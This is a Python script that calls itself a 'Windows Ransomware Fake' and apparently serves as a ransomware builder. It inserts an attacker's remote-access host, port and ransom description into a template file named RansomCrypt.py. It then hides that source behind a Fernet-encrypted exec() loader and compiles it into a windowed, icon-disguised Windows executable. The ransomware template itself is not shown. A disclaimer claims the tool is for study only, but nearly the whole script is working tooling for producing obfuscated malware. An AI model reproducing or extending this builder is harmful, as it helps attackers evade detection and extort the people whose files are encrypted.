#!/usr/bin/env python3
import re
from pystyle import Colorate, Colors
from colorama import Fore, init
import os
import sys
import time
from cryptography.fernet import Fernet
from PIL import Image

init(autoreset=True)
os.system('cls' if os.name == 'nt' else 'clear')

def log_txt(txt):
    print(Fore.BLUE+'[!] ', end='')
    for lts in txt:
        print(lts, end='')
        time.sleep(0.05)


def modify(file_path, desc, remote_access_host, remote_access_port):
    try:
        # Leer las líneas del archivo fuente
        with open(file_path, 'r') as file:
            lines = file.readlines()

        updated_lines = []
        # Patrones para identificar las líneas a modificar
        user_pattern = re.compile(r"^\s*Desc\s*=\s*['\"](.*)['\"]\s*$")
        host_pattern = re.compile(r'^\s*HOST\s*=\s*.*$')
        port_pattern = re.compile(r'^\s*PORT\s*=\s*.*$')

        for line in lines:
            if user_pattern.match(line):
                txt = 'Subiendo descripcion...\n'
                log_txt(txt)
                time.sleep(3)
                updated_lines.append(f"Desc = '{desc}'\n")
            elif host_pattern.match(line):
                txt2 = 'Editando el HOST...\n'
                log_txt(txt2)
                time.sleep(3)
                updated_lines.append(f"HOST = '{remote_access_host}'\n")
            elif port_pattern.match(line):
                txt3 = 'Editando el PORT...\n'
                log_txt(txt3)
                time.sleep(3)                
                updated_lines.append(f"PORT = '{remote_access_port}'\n")
            else:
                updated_lines.append(line)

        gkey = 'Generando tu clave Fernet...\n'
        log_txt(gkey)
        time.sleep(2)
        key = Fernet.generate_key()
        e = Fernet(key)
        encoded_lines = [line.encode() for line in updated_lines]
        encrypted_data = e.encrypt(b''.join(encoded_lines))
        edited_code = f'''
from cryptography.fernet import Fernet
key = {key}
code = {encrypted_data}
decoder = Fernet(key).decrypt(code)
exec(decoder)
'''
            

        # Escribir las líneas actualizadas en el archivo destino
        with open('edited_ransom.py', 'w') as file:
            file.writelines(edited_code)

    except Exception as e:
        print(f"Error al manejar los archivos: {e}")


try:
    def main():
        banner = '''
    8888b.     db    88""Yb 88  dP  dP""b8 88""Yb Yb  dP 88""Yb 888888
     8I  Yb   dPYb   88__dP 88odP  dP   `" 88__dP  YbdP  88__dP   88
     8I  dY  dP__Yb  88"Yb  88"Yb  Yb      88"Yb    8P   88"""    88
    8888Y"  dP""""Yb 88  Yb 88  Yb  YboodP 88  Yb  dP    88       88
                        Created by: 74lg0
                      Windows Ransomware Fake ;)
    '''
        print(Colorate.Horizontal(Colors.green_to_blue, banner))
        print(Fore.RED + "[!] I do not take responsibility for misuse, this ransomware was created for study purposes only.\nI do not control their actions.")
        file_path = 'RansomCrypt.py'
        desc = input(Fore.YELLOW + "Descripcion => ")
        name = input('Name for app => ')
        icon = input('Icon for app optional (.png) => ')
        if icon.endswith('.ico'):
            pass
        
        elif icon == '':
            pass

        elif icon.endswith('.png'):
            converter_icon = Image.open(icon)
            converter_icon.save('icon.ico', format='ICO')
        else:
            print('The image must have the extension (.ico) or (.png)')
            sys.exit()

        remote_access_host = input('Your remote access host => ')
        remote_access_port = input('Your remote access port => ')
        os.system('cls' if os.name == 'nt' else 'clear')
        modify(file_path, desc, remote_access_host, remote_access_port)
        ejecutable = input(Fore.GREEN+'Deseas crear el ejecutable (.EXE) Y/N\n=> ')
        if ejecutable.lower() == 'y':
            if icon == '':
                command = f'pyinstaller --noconfirm --onefile --windowed --name "{name}" "edited_ransom.py"'
                os.system(command)
            else:
                command = f'pyinstaller --noconfirm --onefile --windowed --icon "icon.ico" --name "{name}" "edited_ransom.py"'
                os.system(command)
        elif ejecutable.lower() == 'n':
            print(Fore.YELLOW+"Entendido, que tengas un excelente dia")
            sys.exit()

except KeyboardInterrupt:
        sys.exit()
    
except Exception as e:
    print(Colorate.Horizontal(Colors.red_to_blue, f'ERROR {e}'))

if __name__ == "__main__":
    main()
